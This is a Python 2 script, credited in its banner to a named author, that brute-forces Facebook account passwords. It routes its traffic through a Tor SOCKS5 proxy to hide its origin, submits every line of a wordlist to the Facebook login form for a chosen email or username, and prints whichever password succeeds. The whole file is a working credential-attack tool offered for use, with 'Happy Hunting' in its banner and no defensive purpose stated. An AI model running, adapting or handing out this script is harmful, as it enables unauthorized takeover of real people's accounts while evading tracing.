
from robobrowser import RoboBrowser
import socket
import socks #From PySocks and Requer win_inet_pton
import requests

def connect_tor():
    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,"127.0.0.1",9050,True)
    socket.socket = socks.socksocket

def main():
     connect_tor()
     print '''                         [+]Md Rafsan jani Made Facebook BruteForcer with Tor Curcite
                                       [+]Gmail==>shazidno123@gmail.com
                                       [+] Phone ==> 01818144463
                           --------------- ----      Happy Hunting  -----------------------------

     '''
     email = raw_input('input Email or Username====>')
     passwd = raw_input('input worlist file name  ====>')
     print '-----------Starting Attack-------------\n'
     browser = RoboBrowser(parser='html.parser')
     browser.open('https://www.facebook.com/login')
     form = browser.get_form()
     form['email'] = email


     with open(passwd) as files:
        read_file = files.readlines()
        for x in read_file:
           form['pass']= x
           browser.submit_form(form)
           if str(browser.url) == 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100':
                ip = requests.get('https://api.ipify.org/?format=json')
                print ip.text
                print '[$]Trying ---->{0}'.format(x)
           else:
                print '#########################'
                print '[+]Success==>{0}'.format(x)
                print '#########################'
                break







if __name__ == '__main__':
    try:
       main()
    except:
       print "[!!!]Tor Not Runnning Run Tor"



